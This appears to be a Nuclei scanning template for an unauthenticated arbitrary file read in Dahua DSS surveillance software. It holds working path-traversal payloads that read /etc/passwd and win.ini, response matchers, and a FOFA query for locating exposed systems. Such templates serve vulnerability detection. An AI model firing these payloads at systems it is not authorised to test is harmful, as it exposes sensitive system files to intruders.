id: dahua-dss-attachment-downloadAtt-fileread-0
info:
  name: 大华 DSS 城市安防监控系统 attachment_downloadAtt.action - 任意文件读取漏洞
  author: leadlife
  severity: high
  description: 大华DSS数字监控系统 attachment_downloadByUrlAtt.action接口存在任意文件读取漏洞，未经身份验证的远程攻击者 可以利用此漏洞获取系统内部敏感文件信息，使系统处于极不安全的状态。
  reference: 
    - https://github.com/wy876/POC/blob/main/%E5%A4%A7%E5%8D%8E/%E5%A4%A7%E5%8D%8EDSS%E6%95%B0%E5%AD%97%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9Fattachment_downloadAtt.action%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    fofa-query: body="/portal/include/script/dahuaDefined/headCommon.js?type=index" && title="DSS" || app="dahua-DSS"
  tags: dahua,dss,fileread,iot

http:
  - method: GET
    path:
      - "{{BaseURL}}/portal/attachment_downloadAtt.action?filePath=../../../../../../etc/passwd"
      - "{{BaseURL}}/portal/attachment_downloadAtt.action?filePath=../../../../../../c:/windows/win.ini"
        
    stop-at-first-match: true
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or